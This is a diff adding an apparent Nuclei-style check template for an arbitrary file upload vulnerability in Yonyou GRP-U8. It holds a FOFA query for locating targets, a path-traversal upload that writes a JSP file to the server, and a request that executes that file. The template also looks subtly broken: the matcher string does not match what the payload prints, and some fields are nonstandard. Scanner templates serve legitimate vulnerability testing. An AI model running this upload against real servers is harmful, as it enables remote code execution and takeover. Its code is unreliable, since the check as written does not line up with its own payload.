@@ -1,0 +1,47 @@
+id: 用友 GRP-U8 UploadFileDat 任意文件上传漏洞
+time: '2023-02-21'
+
+
+info:
+  name: 用友GRP-U8 软件 U8AppProxy 任意文件上传漏洞
+  severity: high
+  description: 用友 GRP-U8 UploadFileData接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限。
+  reference: https://blog.csdn.net/holyxp/article/details/131936338
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: body=“window.location.replace(“login.jsp?up=1”)” || body=“GRP-U8”
+  
+http:
+  - method: 
+      - POST
+      - GET
+    path:
+      - "{{BaseURL}}/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename=debugg.jsp&filename=1.jpg"
+      - "{{BaseURL}}/R9iPortal/debugg.jsp"
+    
+    Rheader:
+      - Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 & Accept-Encoding:gzip, deflate & Cookie:JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9 & Content-Type:multipart/form-data & Upgrade-Insecure-Requests:1
+        
+    body: 
+      - |
+        ------WebKitFormBoundary92pUawKc
+        Content-Disposition: form-data; name="myFile";filename="test.jpg"
+        
+        <% out.println("0xold6");%>
+        ------WebKitFormBoundary92pUawKc--
+        
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "0xold6!!!"
+
+      - type: status
+        status:
+          - 200
+    
